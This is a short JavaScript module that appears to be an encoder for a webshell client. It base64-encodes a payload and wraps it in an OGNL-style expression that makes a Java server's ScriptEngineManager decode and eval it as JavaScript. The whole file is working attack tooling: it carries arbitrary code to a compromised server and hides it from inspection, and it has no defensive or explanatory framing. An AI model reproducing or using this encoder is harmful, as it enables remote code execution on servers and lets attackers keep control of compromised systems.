'use strict';

module.exports = (pwd, data, ext = null) => {
  data[pwd] = `(new javax.script.ScriptEngineManager()).getEngineByName("js").eval(new String(@com.sun.org.apache.xml.internal.security.utils.Base64@decode('${Buffer.from(data['_']).toString('base64')}')))`;
  delete data['_'];
  return data;
}
